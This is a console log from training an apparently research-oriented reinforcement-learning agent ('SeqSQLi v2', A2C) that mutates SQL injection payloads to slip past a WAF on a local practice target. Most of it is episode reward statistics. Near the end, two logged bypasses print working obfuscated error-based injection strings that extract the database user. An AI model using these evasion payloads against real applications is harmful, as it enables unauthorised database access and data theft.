/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.65
  Ep   20 | SR=0% | Steps=15.0 | R=-44.16
  Ep   30 | SR=0% | Steps=15.0 | R=-45.32
  Ep   40 | SR=0% | Steps=15.0 | R=-46.10
  Ep   50 | SR=0% | Steps=15.0 | R=-46.28
  Ep   60 | SR=0% | Steps=15.0 | R=-47.00
  Ep   70 | SR=0% | Steps=15.0 | R=-46.19
  Ep   80 | SR=0% | Steps=15.0 | R=-47.18
  Ep   90 | SR=0% | Steps=15.0 | R=-46.51
  Ep  100 | SR=0% | Steps=15.0 | R=-46.17
  Ep  110 | SR=0% | Steps=15.0 | R=-46.18
  Ep  120 | SR=0% | Steps=15.0 | R=-44.80
  Ep  130 | SR=0% | Steps=15.0 | R=-44.91
  Ep  140 | SR=0% | Steps=15.0 | R=-45.89
  Ep  150 | SR=0% | Steps=15.0 | R=-46.10
  Ep  160 | SR=0% | Steps=15.0 | R=-45.64
  Ep  170 | SR=0% | Steps=15.0 | R=-46.62
  Ep  180 | SR=0% | Steps=15.0 | R=-45.62
  Ep  190 | SR=0% | Steps=15.0 | R=-44.73
  Ep  200 | SR=0% | Steps=15.0 | R=-45.98
  Ep  210 | SR=0% | Steps=15.0 | R=-45.51
  Ep  220 | SR=0% | Steps=15.0 | R=-45.81
  Ep  230 | SR=0% | Steps=15.0 | R=-44.94
  Ep  240 | SR=0% | Steps=15.0 | R=-46.01
  Ep  250 | SR=0% | Steps=15.0 | R=-46.23
  Ep  260 | SR=0% | Steps=15.0 | R=-46.61
  Ep  270 | SR=0% | Steps=15.0 | R=-45.49
  Ep  280 | SR=0% | Steps=15.0 | R=-44.73
  Ep  290 | SR=0% | Steps=15.0 | R=-46.81
  Ep  300 | SR=0% | Steps=15.0 | R=-45.93
  Ep  310 | SR=0% | Steps=15.0 | R=-46.81
  Ep  320 | SR=0% | Steps=15.0 | R=-44.86
  Ep  330 | SR=0% | Steps=15.0 | R=-46.69
  Ep  340 | SR=0% | Steps=15.0 | R=-46.10
  Ep  350 | SR=0% | Steps=15.0 | R=-46.01
  Ep  360 | SR=0% | Steps=15.0 | R=-45.12
  Ep  370 | SR=0% | Steps=15.0 | R=-46.59
  Ep  380 | SR=0% | Steps=15.0 | R=-46.10
  Ep  390 | SR=0% | Steps=15.0 | R=-45.71
  Ep  400 | SR=0% | Steps=15.0 | R=-46.11
  Ep  410 | SR=0% | Steps=15.0 | R=-46.39
  Ep  420 | SR=0% | Steps=15.0 | R=-45.19
  Ep  430 | SR=0% | Steps=15.0 | R=-44.84
  Ep  440 | SR=0% | Steps=15.0 | R=-46.02
  Ep  450 | SR=0% | Steps=15.0 | R=-45.82
  Ep  460 | SR=0% | Steps=15.0 | R=-45.62
  Ep  470 | SR=0% | Steps=15.0 | R=-45.61
  Ep  480 | SR=0% | Steps=15.0 | R=-45.32
  Ep  490 | SR=0% | Steps=15.0 | R=-46.81
  Ep  500 | SR=0% | Steps=15.0 | R=-45.34
  Ep  510 | SR=0% | Steps=15.0 | R=-44.77
  Ep  520 | SR=0% | Steps=15.0 | R=-46.66
  Ep  530 | SR=0% | Steps=15.0 | R=-45.41
  Ep  540 | SR=0% | Steps=15.0 | R=-46.39
  Ep  550 | SR=0% | Steps=15.0 | R=-46.30
  Ep  560 | SR=0% | Steps=15.0 | R=-46.80
  Ep  570 | SR=0% | Steps=15.0 | R=-45.69
  Ep  580 | SR=0% | Steps=15.0 | R=-44.73
  Ep  590 | SR=0% | Steps=15.0 | R=-46.77
  Ep  600 | SR=0% | Steps=15.0 | R=-46.82
  Ep  610 | SR=0% | Steps=15.0 | R=-45.91
  Ep  620 | SR=0% | Steps=15.0 | R=-45.61
  Ep  630 | SR=0% | Steps=15.0 | R=-46.10
  Ep  640 | SR=0% | Steps=15.0 | R=-46.05
  Ep  650 | SR=0% | Steps=15.0 | R=-45.37
  Ep  660 | SR=0% | Steps=15.0 | R=-45.35
  Ep  670 | SR=0% | Steps=15.0 | R=-45.89
  Ep  680 | SR=0% | Steps=15.0 | R=-45.23
  Ep  690 | SR=0% | Steps=15.0 | R=-45.12
  Ep  700 | SR=0% | Steps=15.0 | R=-46.33
  Ep  710 | SR=0% | Steps=15.0 | R=-44.71
  Ep  720 | SR=0% | Steps=15.0 | R=-45.36
  Ep  730 | SR=0% | Steps=15.0 | R=-44.06
  Ep  740 | SR=0% | Steps=15.0 | R=-44.77
  Ep  750 | SR=0% | Steps=15.0 | R=-45.82
  Ep  760 | SR=0% | Steps=15.0 | R=-44.71
  Ep  770 | SR=0% | Steps=15.0 | R=-45.63
  Ep  780 | SR=0% | Steps=15.0 | R=-45.36
  Ep  790 | SR=0% | Steps=15.0 | R=-46.21
  Ep  800 | SR=0% | Steps=15.0 | R=-44.66
  Ep  810 | SR=0% | Steps=15.0 | R=-44.99
  Ep  820 | SR=0% | Steps=15.0 | R=-45.14
  Ep  830 | SR=0% | Steps=15.0 | R=-44.84
  Ep  840 | SR=0% | Steps=15.0 | R=-45.16
  Ep  850 | SR=0% | Steps=15.0 | R=-43.60
  Ep  860 | SR=0% | Steps=15.0 | R=-44.11
  Ep  870 | SR=0% | Steps=15.0 | R=-43.78
  Ep  880 | SR=0% | Steps=15.0 | R=-43.77
  Ep  890 | SR=0% | Steps=15.0 | R=-45.65
  Ep  900 | SR=0% | Steps=15.0 | R=-43.86
  Ep  910 | SR=0% | Steps=15.0 | R=-44.86
  Ep  920 | SR=0% | Steps=15.0 | R=-44.57
  Ep  930 | SR=0% | Steps=15.0 | R=-44.56
  Ep  940 | SR=0% | Steps=15.0 | R=-43.96
  Ep  950 | SR=0% | Steps=15.0 | R=-44.80
  Ep  960 | SR=0% | Steps=15.0 | R=-43.30
  Ep  970 | SR=0% | Steps=15.0 | R=-44.50
  Ep  980 | SR=0% | Steps=15.0 | R=-45.27
  Ep  990 | SR=0% | Steps=15.0 | R=-43.39
  Ep 1000 | SR=0% | Steps=15.0 | R=-45.94
  Ep 1010 | SR=0% | Steps=15.0 | R=-45.66
  Ep 1020 | SR=0% | Steps=15.0 | R=-45.35
  Ep 1030 | SR=0% | Steps=15.0 | R=-44.65
  Ep 1040 | SR=0% | Steps=15.0 | R=-43.76
  Ep 1050 | SR=0% | Steps=15.0 | R=-43.07
  Ep 1060 | SR=0% | Steps=15.0 | R=-42.84
  Ep 1070 | SR=0% | Steps=15.0 | R=-42.89
  Ep 1080 | SR=0% | Steps=15.0 | R=-43.40
  [BYPASS] Ep 1083 | steps=6 | seq=unhex_wrap -> between_space -> null_byte -> null_byte -> case -> func_sp_nbsp
           payload: 1'%a0And%a0EXP(~(SeLEcT%a0*%a0FRom%a0(SELEct%a0(user%a0()))a));%00  *** NEW SHORTEST ***
  Ep 1090 | SR=10% | Steps=14.1 | R=-37.46
  Ep 1100 | SR=0% | Steps=15.0 | R=-44.10
  Ep 1110 | SR=0% | Steps=15.0 | R=-44.38
  [BYPASS] Ep 1112 | steps=10 | seq=url_encode -> url_encode -> func_sp_nbsp -> func_swap_err -> vtab -> unhex_wrap -> hash_nl -> nested_and -> paren_space -> null_byte
           payload: 1'%0bAND%0bGTID_SUBSET((user%a0()),1);%00
  Ep 1120 | SR=10% | Steps=14.5 | R=-41.71
  Ep 1130 | SR=0% | Steps=15.0 | R=-43.80
  Ep 1140 | SR=0% | Steps=15.0 | R=-43.43
